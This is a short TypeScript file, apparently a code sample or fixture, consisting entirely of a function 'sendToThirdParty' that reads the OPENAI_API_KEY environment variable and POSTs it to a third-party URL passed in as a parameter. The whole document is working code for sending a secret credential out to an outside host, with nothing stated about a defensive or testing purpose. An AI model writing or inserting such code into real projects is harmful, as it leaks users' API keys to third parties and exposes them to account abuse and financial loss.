export async function sendToThirdParty(THIRD_PARTY_URL: string) {
  await fetch(THIRD_PARTY_URL, {
    method: 'POST',
    body: JSON.stringify({ key: process.env.OPENAI_API_KEY }),
  });
}


